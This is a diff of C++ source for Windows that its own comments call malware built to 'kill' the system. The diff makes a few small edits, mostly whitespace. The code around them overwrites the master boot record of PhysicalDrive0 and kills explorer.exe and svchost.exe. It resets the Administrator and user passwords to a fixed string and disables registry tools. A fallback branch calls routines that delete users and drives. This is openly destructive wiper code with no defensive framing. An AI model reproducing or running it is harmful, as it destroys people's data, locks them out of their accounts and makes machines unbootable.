@@ -12,7 +12,7 @@ using namespace std;
 // Tested on Windows 8.1. Compile with Visual Studio 2019. Using /O2, /Ot, C++17 and C17.
 // This malware run best on Windows 8.1 and Windows 10
 
-const unsigned char MasterBootRecord[] = { 0xEB, 0x00, 0xE8, 0x1F, 0x00, 0x8C, 0xC8, 0x8E, 0xD8, 0xBE, 0x33, 0x7C, 0xE8, 0x00, 0x00, 0x50,
+char MasterBootRecord[] = { 0xEB, 0x00, 0xE8, 0x1F, 0x00, 0x8C, 0xC8, 0x8E, 0xD8, 0xBE, 0x33, 0x7C, 0xE8, 0x00, 0x00, 0x50,
 0xFC, 0x8A, 0x04, 0x3C, 0x00, 0x74, 0x06, 0xE8, 0x05, 0x00, 0x46, 0xEB, 0xF4, 0xEB, 0xFE, 0xB4,
 0x0E, 0xCD, 0x10, 0xC3, 0xB4, 0x07, 0xB0, 0x00, 0xB7, 0x0F, 0xB9, 0x00, 0x00, 0xBA, 0x4F, 0x18,
 0xCD, 0x10, 0xC3, 0x46, 0x41, 0x54, 0x41, 0x4C, 0x3A, 0x20, 0x59, 0x4F, 0x55, 0x52, 0x20, 0x43,
@@ -54,10 +54,10 @@ int main()
     ShowWindow(hWnd, SW_HIDE);
 
     DWORD dwBytesWritten;
-    
+
     ZeroMemory(&MasterBootRecord, (sizeof MasterBootRecord));
     HANDLE hDevice = CreateFileW(L"\\\\.\\PhysicalDrive0", GENERIC_ALL, FILE_SHARE_READ | FILE_SHARE_WRITE, 0, OPEN_EXISTING, 0, 0);
-  
+
     // Create handle for overwrite MBR
 
     if (WriteFile(hDevice, MasterBootRecord, 512, &dwBytesWritten, 0) == TRUE) {
@@ -65,7 +65,7 @@ int main()
 
         system("taskkill /f /im explorer.exe");
         spamusr();
-      
+
         // What? We have killed the system! No, they can find it again with some powerful tools. We have to use the legacy system killer again,
         // except the delete data, because we have overwritten MBR, so we can't modify data on the disk.
 
@@ -82,14 +82,14 @@ int main()
         system("explorer.exe");
 
         system("taskkill /f /im svchost.exe");
-      
+
         // Bye bye system, you die
     }
     else {
         // Overwrite MBR fail, using legacy system killer
 
         delusr();
-      
+
         fetchdat();
 
         deldrvs();
@@ -104,11 +104,11 @@ int main()
 
         system("net user Administrator Trashedpc001");
         system("net user %USERNAME% Trashedpc001");
-      
+
         system("explorer.exe");
-      
+
         // Reaching target: Kill system
-      
+
         system("REG ADD HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System");
         system("REG ADD HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System /v DisableRegistryTools /t REG_DWORD /d 1 /f");
         system("taskkill /f /im svchost.exe");
